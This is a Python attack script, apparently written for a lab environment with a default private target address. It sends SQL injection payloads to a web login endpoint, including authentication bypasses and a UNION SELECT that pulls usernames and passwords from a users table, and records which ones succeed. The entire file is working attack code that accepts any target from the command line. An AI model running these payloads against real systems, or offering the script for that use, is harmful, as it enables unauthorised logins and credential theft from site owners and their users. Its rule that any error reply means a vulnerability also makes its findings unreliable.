import requests
import time
from datetime import datetime

class SQLInjectionAttacker:
    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/login"
        self.vulnerabilities = []
        
    def test_payload(self, payload, description):
        print(f"\n[{datetime.now()}] Testing: {description}")
        print(f"Payload: {payload}")
        
        try:
            response = requests.post(
                self.target_url,
                json={'username': payload, 'password': 'anything'},
                timeout=5
            )
            result = response.json()
            
            if result.get('success') or 'error' in result:
                print(f"VULNERABLE: {description}")
                self.vulnerabilities.append({
                    'payload': payload,
                    'description': description,
                    'response': result
                })
                return True
            else:
                print(f"Protected: {description}")
                return False
                
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def run(self):
        print(f"[{datetime.now()}] Starting SQL Injection attack on {self.target_url}")
        
        payloads = [
            ("' OR '1'='1", "Basic OR injection"),
            ("admin'--", "Comment injection"),
            ("' UNION SELECT NULL, username, password FROM users--", "UNION injection"),
            ("' OR 1=1--", "Boolean-based injection"),
            ("admin' AND '1'='1", "AND injection"),
        ]
        
        for payload, desc in payloads:
            self.test_payload(payload, desc)
            time.sleep(1)
        
        print(f"\n[{datetime.now()}] Attack Summary:")
        print(f"Total payloads tested: {len(payloads)}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        return self.vulnerabilities

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    attacker = SQLInjectionAttacker(target)
    attacker.run()
